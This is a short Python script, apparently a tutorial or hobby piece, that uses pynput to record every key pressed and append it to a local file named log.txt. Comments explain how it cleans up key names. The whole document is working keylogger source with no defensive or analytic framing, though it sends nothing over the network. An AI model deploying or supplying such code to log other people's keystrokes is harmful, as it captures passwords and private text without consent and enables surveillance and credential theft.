from pynput.keyboard import  Listener


def write_to_file(key):
    letter = str(key)

    # replaces the double quotes with  a space. Plus, it allows us to add  a space between the letters.
    #letter = letter.replace("'", " ")

    # replaces the double quotes with a blank.
    letter = letter.replace("'","")

    # replaces the key space with nothing.

    if letter == 'Key.space':
        letter = ' '

    if letter == 'Key.shift_r':
        letter = ''

    if letter == "Key.ctrl_l":
        letter = ""

    if letter == "Key.enter":
        letter = "\n"

    if letter == 'Key.backspace':
        letter = ''

    with open("log.txt",'a') as f: # to create a file/open it and write to it.
      f.write(letter)  # writes to the file with the quoted text to the file


with Listener(on_press=write_to_file) as l: # listener is basically L in this case. This will run when you press a key.
  l.join()

